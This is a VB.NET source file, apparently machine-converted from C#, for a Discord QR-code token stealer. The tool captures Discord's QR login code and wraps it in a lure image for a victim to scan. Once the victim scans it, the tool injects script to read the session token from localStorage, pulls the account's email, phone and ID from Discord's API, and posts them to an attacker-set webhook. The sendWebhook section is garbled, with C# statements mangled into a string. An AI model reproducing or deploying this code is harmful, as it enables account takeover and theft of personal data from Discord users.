Imports System
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports CefSharp
Imports System.IO
Imports System.Diagnostics
Imports System.Threading
Imports System.Net
Imports Newtonsoft.Json
Imports System.Text
Imports System.Linq

Namespace Discord_QR_Token_Stealer
	Partial Public Class qrGrabber
		Inherits Form

		' stupid shit
		Public createdQr As Boolean = False

		Public tokenInfo As TokenInformation = Nothing

		Public Shared webhookUrl As String = String.Empty
		Public loggedTokens As New List(Of String)()

		Public timeLeftTimer As New System.Windows.Forms.Timer()
		Public timeLeft As TimeSpan
		Public timeStart As Date
		Public timeEnd As Date
		Public num As Integer = 0

		' init
		Public Sub New()
			InitializeComponent()
		End Sub

		' onload code
		Private Sub qrGrabber_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			' if console.log exists, delete it
			If File.Exists("console.log") Then
				File.Delete("console.log")
			End If

			' import webhooks
			If File.Exists("webhook.txt") Then
				webhookUrl = File.ReadAllText("webhook.txt")
			End If

			' delete the prev ones
			For Each file In Directory.GetFiles(".")
				If file.Contains("finalized") Then
					System.IO.File.Delete(file)
				End If
			Next file

			timeLeftTimer.Interval = 1000
			AddHandler timeLeftTimer.Tick, Sub(a, b)
				timeLeft = timeEnd.Subtract(Date.UtcNow)

				If timeLeft.TotalSeconds <= 0 Then
					Return
				End If

				lblTimeLeft.Invoke(CType(Sub() lblTimeLeft.Text = $"{Math.Round(timeLeft.TotalSeconds)} seconds until expiration", MethodInvoker))
			End Sub
		End Sub

		Private Sub resetTimer()
			timeStart = Date.UtcNow
			timeEnd = timeStart.AddMinutes(2)
		End Sub

		' inject code to get the QR code
		Private Sub injectCode()
			' countdown timer
			resetTimer()
			timeLeftTimer.Start()

			' sleep for rendering shit
			Thread.Sleep(1000)
			chromiumWebBrowser1.ExecuteScriptAsync("console.log(document.getElementsByTagName('img')[0].src)")
		End Sub

		Private Sub accountLoggedIn()
			timeLeftTimer.Stop()
			chromiumWebBrowser1.EvaluateScriptAsync("var s=document.createElement('iframe');s.style.display='none';document.body.appendChild(s);console.log('token;'+s.contentWindow.localStorage.token);")

			' clear out the side panel to template.png
			currentCode.Load("template.png")
			createLog("Changed current code to template.png because of log in")
		End Sub

		' change a base64 string back into a png and save it
		Private Sub base64ToPng(ByVal inp As String)
			Dim bytes = Convert.FromBase64String(inp.Substring(22))
			Dim img = New FileStream("rawcode.png", FileMode.Create)
			img.Write(bytes, 0, bytes.Length)
			img.Close()

			' create the final image
			createFinalImage()

			Debug.WriteLine("Exported base64 to rawcode.png")
		End Sub

		' query discord api for token details (email, phone, tag, id, etc)
'INSTANT VB NOTE: In the following line, Instant VB substituted 'Object' for 'dynamic' - this will work in VB with Option Strict Off:
		Private Function getTokenDetails(ByVal token As String) As Object
			Try
				' casted as httpwebrequest because i couldnt set user agent without error, fuck you
				Dim client = WebRequest.Create("https://discord.com/api/v9/users/@me")
				client.Headers.Add("authorization", token)

				' lazy work right here
				Dim json = JsonConvert.DeserializeObject(Of TokenInformation)((New StreamReader(client.GetResponse().GetResponseStream())).ReadToEnd())
				json.Token = token

				' replace null phone number with "not registered"
				If json.Phone Is Nothing Then
					json.Phone = "Not registered"
				End If

				Return json
			Catch ex As Exception
				' even more lazy work
				Debug.WriteLine(ex)
				Return Nothing
			End Try
		End Function

		' create the final image
		Private Sub createFinalImage()
			Try
				' load template file into picturebox
				currentCode.Image = Image.FromFile("template.png")

				' qr code
'INSTANT VB NOTE: The variable top was renamed since Visual Basic does not handle local variables named the same as class members well:
				Dim top_Renamed = Image.FromFile("overlay.png")
				Dim qr = Image.FromFile("rawcode.png")
				Dim grap = Graphics.FromImage(qr)
				'grap.DrawImage(top, (qr.Width / 2) - (top.Width / 2), (qr.Height / 2) - (top.Height / 2));
				grap.DrawImage(top_Renamed, (top_Renamed.Width \ 2), (top_Renamed.Height \ 2))

				' final image
				Dim temp = Image.FromFile("template.png")
				Dim grap2 = Graphics.FromImage(temp)
				grap2.DrawImage(qr, 120, 409)

				' GOD FUCKING DAMN IT
				' fuck all this shit
				' extra hour i was up fixing stupid ass fucking GDI issues, go fuck yourself
				' fucking deal with this autistic code
				Try
					temp.Save($"finalized-{num}.png")
					temp.Dispose()

					If File.Exists($"finalized-{num-2}.png") Then
						File.Delete($"finalized-{num-2}.png")
					End If
				Catch ex As Exception
					Debug.WriteLine(ex)
				End Try


				' set image to qr
				currentCode.Image = Image.FromFile($"finalized-{num}.png")

				' dispose images
				top_Renamed.Dispose()
				qr.Dispose()

				' dispose graphics
				grap.Dispose()
				grap2.Dispose()

				' show message box if not first time
				'if (createdQr)
				'    MessageBox.Show("Previous QR code expired, new one has been generated", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
				createdQr = True
				num += 1
			Catch ex As Exception
				Debug.WriteLine(ex)
			End Try
		End Sub

		Private Sub updateInfo(ByVal token As String)
			If loggedTokens.Contains(token) Then
				Return
			End If

			' token information frm token supplied
			tokenInfo = getTokenDetails(token)

			' invoke it cause im too lazy to check if its required or not
			lblToken.Invoke((MethodInvoker)(Sub()
				' setting data, substrings are for proper formatting
				lblToken.Text = token
				lblTag.Text = $"{tokenInfo.Username}#{tokenInfo.Discriminator}"
				lblId.Text = tokenInfo.Id
				lblPhone.Text = tokenInfo.Phone
				lblEmail.Text = tokenInfo.Email
			End Sub))

			' add to the logged toksn list so taht it doesnt send multiple hooks
			loggedTokens.Add(token)

			' send the webhook
			sendWebhook()

			' add to uniques.txt
			addToUniques(token)
		End Sub

		' says its loaded
		Private Sub chromiumWebBrowser1_IsBrowserInitializedChanged(ByVal sender As Object, ByVal e As EventArgs) Handles chromiumWebBrowser1.IsBrowserInitializedChanged
			' clear labels n shit
			clearInfo()

			' load discord login
			chromiumWebBrowser1.Load("https://discord.com/login")

			' register console message event
			AddHandler chromiumWebBrowser1.ConsoleMessage, Sub(source, msg)
				' more lazy coding
				If msg.Message.Contains("handshake complete awaiting remote auth") Then
					injectCode()
				ElseIf msg.Message.StartsWith("data:image/png;base64,") Then
					base64ToPng(msg.Message)
				ElseIf msg.Message.StartsWith("token;") Then
					updateInfo(msg.Message.Substring(7, msg.Message.Length - 8))
				End If

				'File.AppendAllText("console.log", $"{msg.Message}\n");
				createLog(msg.Message)
			End Sub
		End Sub

		' clicking on side image
		Private Sub currentCode_Click(ByVal sender As Object, ByVal e As EventArgs) Handles currentCode.Click
			' make sure its not just null
			If currentCode.Image Is Nothing Then
				Return
			End If

			' copying to clipboard
			Clipboard.SetImage(currentCode.Image)
		End Sub

		' if the address has changed and its not the login page anymore, congrats, youve done something i suppose
		Private Sub chromiumWebBrowser1_AddressChanged(ByVal sender As Object, ByVal e As AddressChangedEventArgs) Handles chromiumWebBrowser1.AddressChanged
			' about the laziest i can get i think
			If chromiumWebBrowser1.Address <> "https://discord.com/login" Then
				accountLoggedIn()
			End If
		End Sub

		' click on one of the 5 labels, copy the content
		Private Sub copyControlText_Click(ByVal sender As Object, ByVal e As EventArgs) Handles lblToken.Click, lblTag.Click, lblEmail.Click, lblPhone.Click, lblId.Click
			' i kinda hate this
'INSTANT VB NOTE: The variable text was renamed since Visual Basic does not handle local variables named the same as class members well:
			Dim text_Renamed = sender.GetType().GetProperty("Text")
			Clipboard.SetText(text_Renamed.GetValue(sender).ToString())
			createLog($"Copied {sender.GetType().GetProperty("Text").GetValue(sender)} to clipboard")
		End Sub

		Private Sub exportInfo_Click(ByVal sender As Object, ByVal e As EventArgs) Handles exportInfo.Click
			' make sure it exists
			If tokenInfo Is Nothing Then
				' fuck u
				MessageBox.Show("No token has been logged to check!")
				Return
			End If

			' bruh
			If Not Directory.Exists("exports") Then
				Directory.CreateDirectory("exports")
			End If

			' its 6:30 am help
			File.WriteAllText($"exports/{tokenInfo.Id}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented))

			' create log
			createLog($"Exported information to exports/{tokenInfo.Id}.txt")
		End Sub

		' reload button
		Private Sub reloadPage_Click(ByVal sender As Object, ByVal e As EventArgs) Handles reloadPage.Click
			clearInfo()
		End Sub

		' fix maybe??
		' seems to work
		Private Sub qrGrabber_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
			Environment.Exit(0)
		End Sub

		Private Sub info_Click(ByVal sender As Object, ByVal e As EventArgs) Handles info.Click
			CType(New infoPanel(), infoPanel).Show()
		End Sub

		Private Sub setHook_Click(ByVal sender As Object, ByVal e As EventArgs) Handles setHook.Click
			CType(New setHook(), setHook).ShowDialog()
			File.WriteAllText("webhook.txt", webhookUrl)
		End Sub

		' this sends the webhook to discord
		Private Sub sendWebhook()
			' make sure the webhook is valid
			If webhookUrl = String.Empty Then
				createLog("Skipping webhook, no URL supplied")
				Return
			ElseIf Not webhookUrl.Contains("https://discord.com/api/webhooks/") Then
				createLog("Skipping webhook, invalid webhook URL")
				Return
			End If

			' make sure token is valid
			If tokenInfo Is Nothing Then
				createLog("Skipping webhook, token information was null")
				Return
			End If

			' if the tokenInfos avatar is null, replace it with sniffcat
			Dim av As String
			If tokenInfo.Avatar Is Nothing Then
				av = "https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg"
			Else
				av = $"https://cdn.discordapp.com/avatars/{tokenInfo.Id}/{tokenInfo.Avatar}.png"
			End If

			' crash prevention
			Try
				' the actual body in JSON format
'INSTANT VB WARNING: Instant VB cannot determine whether both operands of this division are integer types - if they are then you should use the VB integer division operator:
				Dim body = "{""embeds"":[{""title"":""Token grabbed from " & $"{tokenInfo.Username}#{tokenInfo.Discriminator}" & "!"",""description"":""`" & tokenInfo.Token & "`"",""color"":""7407103"",""thumbnail"":{""url"":""" & av & """},""fields"":[{""name"": ""ID"", ""value"": """ & tokenInfo.Id & """},{""name"":""Email"",""value"":""" & tokenInfo.Email & """},{""name"":""Phone"",""value"":""" & tokenInfo.Phone & """}],""timestamp"":""" & Date.Now.ToUniversalTime().ToString("o") & """,""footer"":{""text"":""made by verlox.cc""}}],""avatar_url"":""https: Debug.WriteLine(body); var req = WebRequest.Create(webhookUrl); req.Method = "POST"; req.ContentType = "application/json"; var bytes = Encoding.UTF8.GetBytes(body); req.GetRequestStream().Write(bytes, 0, bytes.Length); var res = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd(); Debug.WriteLine(res); createLog($"Sent webhook, Discord returned:
				' log body to debug
				' make request and set settings
				' convert to bytes so we can write it as the body, stream.write requires bytes
				' get response
				' create a log
					res
				")
			Catch ex As Exception
				Debug.WriteLine(ex)
				createLog($"Failed to send webhook: {ex.Message}")
			End Try
		End Sub

		' create a log in the logbox, use this method so that we dont keep checking if invoke is required and shit
		Private Sub createLog(ByVal text As String)
			' if required, invoke it, else, just add it
			If logBox.InvokeRequired Then
				logBox.Invoke((MethodInvoker)(Sub()
					logBox.Items.Add(text)
					logBox.SelectedIndex = logBox.Items.Count - 1
				End Sub))
			Else
				logBox.Items.Add(text)
				logBox.SelectedIndex = logBox.Items.Count - 1
			End If
		End Sub

		' clear labels and reset timer
		Private Sub clearInfo()
			' more lazy crash protection
			Try
				' reload page
				chromiumWebBrowser1.Load(chromiumWebBrowser1.Address)

				' invoke the whole thing because im too lazy to get a better method and im trynna do a push before midnight
				Invoke((MethodInvoker)(Sub()
					' clear out the labels
					' clear out the picturebox
					lblTag.Text = "Tag"
					lblEmail.Text = "Email"
					lblId.Text = "Id"
					lblPhone.Text = "Phone"
					lblToken.Text = "Token"
					currentCode.Load("template.png")
				End Sub))

				' clear cookies
				Dim cookieManager = chromiumWebBrowser1.GetCookieManager()
				cookieManager.DeleteCookies()

				createLog($"Purged browser cookies.")
			Catch ex As Exception
				createLog($"Failed to delete cookies: {ex.Message}")
				Try
					chromiumWebBrowser1.Load("https://discord.com/login")
				Catch
				End Try
			End Try
		End Sub

		Public Sub addToUniques(ByVal token As String)
			' instantiate new list
			Dim tokens = New List(Of String)()

			' make sure it exists, if it does, read it to tokens var
			If File.Exists("unique.txt") Then
				tokens = File.ReadAllLines("unique.txt").ToList()
			End If

			' update any tokens that have the same snowflake
			For x = 0 To tokens.Count - 1
				Dim tokenSplit = tokens(x).Split("."c)

				If tokens(x).StartsWith("mfa") Then
					If tokens(x).StartsWith(token.Substring(4).Substring(4)) Then
						tokens(x) = token
				ElseIf tokens(x).StartsWith(token.Split("."c).First()) Then
					tokens(x) = token
				End If
				End If
			Next x

			' if its not already in there, then add it
			If Not tokens.Contains(token) Then
				' add it to the file
				File.AppendAllText("unique.txt", $"{token}" & ControlChars.Lf)
				createLog("Updated unique.txt")
			End If
		End Sub
	End Class

	' class that data from tokens gets imported into
	Public Class TokenInformation
		Public Token As String
		Public Id As String
		Public Username As String
		Public Discriminator As String
		Public Email As String
		Public Phone As String
		Public Avatar As String
	End Class
End Namespace
